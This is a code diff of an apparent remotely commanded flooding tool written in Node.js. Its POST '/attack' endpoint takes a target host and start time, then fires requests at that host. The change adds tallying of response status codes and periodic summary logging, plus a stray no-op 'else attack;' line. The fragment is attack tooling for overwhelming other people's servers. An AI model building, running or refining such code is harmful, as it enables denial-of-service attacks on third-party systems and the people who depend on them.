@@ -6,6 +6,8 @@ var Req = require('request');
 var app = express();
 
 var id;
+var im = {}
+im.success = 0;
 const lto = 'https://bb-s.herokuapp.com';
 
 app.use(express.urlencoded({ extended: false }));
@@ -29,6 +31,8 @@ app.post('/attack',function (req,res) {
   var time = req.body.time - getNow();
   var host = req.body.host;
   id = req.body.id;
+  var s=0;
+  var n = 5;
 
   setTimeout(function () {
     attack(host);
@@ -96,8 +100,20 @@ var headers = {
         return;
       }
 
-      if (response.statusCode == '200') Log('success');
-      else Log('error: '+ response.statusCode);
+      s++;
+      if (response.statusCode == '200') im.success++;
+      else {if (im[response.statusCode]) im[response.statusCode]++;
+        else im[response.statusCode] = 1;
+
+       }
+      if (s >= 5)
+      {
+        Log(JSON.stringify(im,null,4));
+        s = 0;
+      }
+      else attack;
+
+
 
 
     });
